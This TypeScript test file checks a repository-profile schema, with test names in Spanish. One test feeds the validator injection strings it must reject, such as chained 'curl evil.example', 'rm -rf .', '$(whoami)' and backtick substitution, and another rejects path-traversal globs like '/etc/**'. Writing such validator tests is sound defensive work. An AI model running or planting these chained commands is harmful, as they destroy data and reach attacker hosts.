import assert from "node:assert/strict";
import { test } from "node:test";
import { PROMOS_PROFILE } from "../testing/promos-profile.ts";
import { profileChecks, RepoProfileSchema, repoStream } from "./repo-profile.ts";

const valid = (profile: unknown) => RepoProfileSchema.safeParse(profile).success;
const withField = (field: string, value: unknown) => ({ ...PROMOS_PROFILE, [field]: value });
const withCheck = (check: string, value: unknown) =>
  withField("checks", { ...PROMOS_PROFILE.checks, [check]: value });

test("el perfil de promos del ADR-011 es válido tal cual", () => {
  assert.deepEqual(RepoProfileSchema.parse(PROMOS_PROFILE), PROMOS_PROFILE);
});

test("los gates de comando son los que tienen comando: promos no tiene lint", () => {
  assert.deepEqual(profileChecks(PROMOS_PROFILE), ["typecheck", "test"]);
  const all = withCheck("lint", "pnpm lint") as typeof PROMOS_PROFILE;
  assert.deepEqual(profileChecks(all), ["typecheck", "lint", "test"]);
});

test("el stream del repo no distingue mayúsculas", () => {
  assert.equal(repoStream("Arian1192/Promos"), "repo:arian1192/promos");
  assert.equal(repoStream("arian1192/promos"), repoStream("ARIAN1192/PROMOS"));
});

test("un comando con metacaracteres de shell, comillas o espacios de más se rechaza", () => {
  for (const command of [
    "pnpm test; curl evil.example",
    "pnpm test && rm -rf .",
    "pnpm test | tee out",
    "pnpm test > out",
    "pnpm $(whoami)",
    "pnpm `whoami`",
    'pnpm "test"',
    "pnpm  test",
    " pnpm test",
    "pnpm test\n",
    "",
  ]) {
    assert.equal(valid(withCheck("test", command)), false, JSON.stringify(command));
  }
  assert.equal(valid(withField("install", "pnpm install; curl x")), false);
  assert.equal(valid(withField("install", null)), false);
});

test("un comando exacto con opciones y rutas se acepta", () => {
  assert.equal(valid(withCheck("test", "node --run test -- apps/api")), true);
  assert.equal(valid(withCheck("lint", "pnpm exec biome check .")), true);
});

test("un glob que sale del repo o es absoluto se rechaza", () => {
  for (const glob of ["/etc/**", "../otro/**", "apps/../../x", "apps\\x", "a\u0007b", ""]) {
    assert.equal(valid(withField("protectedPaths", [glob])), false, JSON.stringify(glob));
  }
});

test("sin globs de tests el perfil no vale: ningún test estaría protegido", () => {
  assert.equal(valid(withField("testFiles", [])), false);
  assert.equal(valid(withField("protectedPaths", [])), true);
});

test("solo lint puede faltar: sin typecheck o sin test la verificación no comprobaría nada", () => {
  const { checks } = PROMOS_PROFILE;
  assert.equal(valid(withField("checks", { ...checks, lint: null })), true);
  assert.equal(valid(withField("checks", { ...checks, typecheck: null })), false);
  assert.equal(valid(withField("checks", { ...checks, test: null })), false);
});

test("el registro admite solo dominios exactos", () => {
  for (const domain of ["*.npmjs.org", "https://registry.npmjs.org", "Registry.npmjs.org", "npm"]) {
    assert.equal(valid(withField("registry", [domain])), false, domain);
  }
  assert.equal(valid(withField("registry", [])), true);
});

test("un campo de más o de menos se rechaza", () => {
  assert.equal(valid({ ...PROMOS_PROFILE, extra: 1 }), false);
  const { docs: _, ...missing } = PROMOS_PROFILE;
  assert.equal(valid(missing), false);
  assert.equal(valid(withField("checks", { typecheck: null, test: null })), false);
});
